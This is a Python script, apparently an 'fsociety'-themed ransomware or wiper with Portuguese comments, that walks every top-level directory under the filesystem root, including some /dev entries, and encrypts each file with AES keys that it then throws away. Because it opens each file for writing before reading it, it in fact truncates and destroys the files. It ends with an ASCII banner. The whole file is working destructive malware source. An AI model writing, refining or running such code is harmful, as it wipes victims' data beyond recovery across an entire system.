#!/usr/bin/python
# -*- coding: UTF-8 -*-
from random import SystemRandom
from Crypto.Hash import SHA256
from Crypto import Random
from Crypto.Cipher import AES
import header
import sys
import subprocess
import os

# ... (restante do código do banner)


def encrypt(filepath, key):
    initialization_vector = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, initialization_vector)
    with open(filepath, 'rb') as infile:
        with open(filepath, 'wb') as outfile:
            while True:
                chunk = infile.read(65536)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))


def load_entropy():
    print("Loading Source of Entropy")
    source = os.urandom(256)
    for i in range(3):
        source += os.urandom(2 ** (21 + i))
        update_progress(((i + 1.0) / 3.0))
    print("\n")
    return source


def update_progress(progress):
    bar_length = 23
    status = "({}%)".format(str(progress)[2:4])
    if progress >= 1.0:
        progress = 1
        status = "COMPLETE"
    block = int(round(bar_length * progress))
    text = "\r{0}\t\t{1}".format(
        "#" * block + " " * (bar_length - block), status)
    sys.stdout.write(text)
    sys.stdout.flush()


def generate_keys(source):
    print("Generating Keys")
    keys = []
    for i in range(9):
        key_length = SystemRandom().randint(128, 256)
        key_bytes = bytes(SystemRandom().choice(source)
                          for _ in range(key_length))
        keys.append(SHA256.new(key_bytes).digest())

        if i % 3 == 0:
            update_progress(((i + 1.0) / 9.0))
    print("\n")
    return keys


def locate_files():
    print("Locating target files.")
    targets = next(os.walk('/'))[1]
    for core in ('proc', 'sys', 'lib', 'run'):
        targets.remove(core)
    return targets


def encrypt_dir(directory, key):
    # Verifica se o diretório existe e é um diretório
    if not os.path.exists(directory) or not os.path.isdir(directory):
        print(f"Diretório inválido: {directory}")
        return

    # Tenta acessar o conteúdo do diretório
    try:
        root = next(os.walk(directory))[0]
        directories = next(os.walk(directory))[1]
        files = next(os.walk(directory))[2]
    except StopIteration:
        print(f"Diretório vazio ou não pôde ser lido: {directory}")
        return

    if len(files) > 0:
        for file in files:
            # Usar os.path.join para construção de caminhos
            path = os.path.join(root, file)
            try:
                # Verifica permissões antes de criptografar
                if os.access(path, os.W_OK):
                    if '/dev' in path[:4]:
                        if not any(substring in path for substring in ('sg', 'fd', 'char', 'by-u', 'pts', 'cpu', 'mapper', 'input', 'bus', 'disk')) and not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq', 'timer', '-', ':', 'disk', 'block', 'char')):
                            encrypt(path, key)
                    else:
                        encrypt(path, key)
                else:
                    print(f"Acesso negado ao arquivo: {path}")
            except Exception as e:
                print(f"Erro ao criptografar {path}: {e}")

    if len(directories) > 0:
        for directory in directories:
            # Usar os.path.join para construção de caminhos
            path = os.path.join(root, directory)
            encrypt_dir(path, key)


def pwn():
    keys = generate_keys(load_entropy())
    dirs = locate_files()
    print("beginning crypto operations")
    for dir in sorted(dirs):
        directory = '/%s' % dir
        # Corrigido para usar format corretamente
        print("Encrypting {}".format(directory))
        encrypt_dir(directory, key=SystemRandom().choice(keys))
    keys = None
    del keys
    print("""\
      __                _      _         
     / _|              (_)    | |        
    | |_ ___  ___   ___ _  ___| |_ _   _ 
    |  _/ __|/ _ \ / __| |/ _ \ __| | | |
    | | \__ \ (_) | (__| |  __/ |_| |_| |
    |_| |___/\___/ \___|_|\___|\__|\__, |
                                    __/ |
                                   |___/

cddddddddddddddddddddddddddddddddddddddddddd;
0Mo..........':ldkO0KKXXKK0kxoc,..........kMd
0Ml......;d0WMMMMMMMMMMMMMMMMMMMWKx:......kMd
0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd
0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd
0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd
0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd
0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd
0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd
0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd
0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd
0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd
0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd
0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd
0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd
0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd
0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd
0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd
0MMO.....................................WMMd
0Mdkc...................................0kOMd
0Ml.:Ol;........';;.......;,........':oX:.kMd
0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd
0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd
0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd
0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd
0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd
0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMNl......kMd
0Ml........lXMMMMMMMMMMMMMMMMMMMKc........kMd
0Ml..........:KMMMMMMMMMMMMMMM0,..........kMd
oO:............xOOOx:'';dOOOOd............lOc
""")
    exit(0)


if __name__ == '__main__':
    subprocess.call('clear')
    header.put()
    print("Executing ...")
    pwn()
